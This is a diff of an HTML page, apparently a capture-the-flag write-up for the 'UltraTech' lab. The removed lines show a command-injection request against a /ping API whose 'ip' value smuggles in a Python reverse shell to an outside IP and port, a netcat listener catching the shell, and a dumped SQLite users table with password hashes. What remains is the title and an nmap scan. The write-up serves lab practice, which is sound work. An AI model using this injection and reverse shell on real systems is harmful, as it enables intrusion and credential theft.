@@ -175,29 +175,7 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p>that's interesting
-we might get a reverse shell</p>
-<p>this is not working we might need a better shell</p>
-<pre><code class="language-bash">curl -G 'http://10.10.211.245:8081/ping' \
-  --data-urlencode $'ip=127.0.0.1`python - &lt;&lt;PY\nimport socket,os,pty\ns=socket.socket()\ns.connect(("10.23.99.212",4444))\nfor fd in (0,1,2): os.dup2(s.fileno(),fd)\npty.spawn("/bin/bash")\nPY`'
-</code></pre>
-<pre><code class="language-bash">nc -lvnp 4444
-Connection from 10.10.211.245:39338
-www@ip-10-10-211-245:~/api$ id
-id
-uid=1002(www) gid=1002(www) groups=1002(www)
-</code></pre>
-<pre><code class="language-bash">cat utech.db.sqlite 
-zz��etableusersusersCREATE TABLE users (
-            login Varchar,
-            password Varchar,
-            type Int
-���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84
-</code></pre>
-<p>Looks like we found some credentials:
-<code>r00t:f357a0c52799563c7c7b76c1e7543a32</code>
-<code>admin0d0ea5111e3c1def594c1684e3b9be84</code></p>
-<h1 id="ultratech-ctf"><a class="header" href="#ultratech-ctf">UltraTech CTF</a></h1>
+                        <h1 id="ultratech-ctf"><a class="header" href="#ultratech-ctf">UltraTech CTF</a></h1>
 <h2 id="recon"><a class="header" href="#recon">Recon</a></h2>
 <h3 id="nmap"><a class="header" href="#nmap">Nmap</a></h3>
 <pre><code class="language-bash">nmap -sV -Pn -oN nmap.txt 10.10.211.245 -p21,22,8081,31331 -sC
